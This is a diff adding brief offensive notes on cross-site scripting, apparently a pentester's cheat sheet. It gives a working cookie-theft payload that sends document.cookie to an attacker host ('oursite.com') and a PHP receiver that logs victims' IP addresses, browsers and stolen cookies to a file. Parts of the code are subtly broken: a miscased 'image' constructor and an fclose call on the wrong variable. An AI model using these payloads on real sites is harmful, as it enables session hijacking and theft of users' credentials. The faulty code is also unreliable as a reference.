@@ -1,1 +1,19 @@
 
+XSS
+https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS) https://www.scip.ch/en/?labs.20171214
+
+    Insert XSS payload in every input area
+    try in url (Get parameters, API endpoints)
+    Use burp intruder on target input form and paste payloads from github
+    we can steal user cookies through xss only if http-only flag is not set on cookie
+
+        Stealing cookies
+        Insert this payload in vulnerable app
+        <script>var i=new image();i.src="http://oursite.com/receiverfiletowritecookies.php?parameter="+escape(document.cookie)</script> 
+
+      **receiving php file on which cookies will be written**
+
+<?php
+        $ip=$_SERVER['REMOTE_ADDR'];$browser=$_SERVER['HTTP_USER_AGENT'];
+        $fp=fopen('txtstorefileonourserver.txt','a');
+        fwrite($fp,$ip.''.$browser." \n");fwrite($fp,urldecode($_SERVER['QUERY_STRING']. " \n\n"));fclose($ip);?>
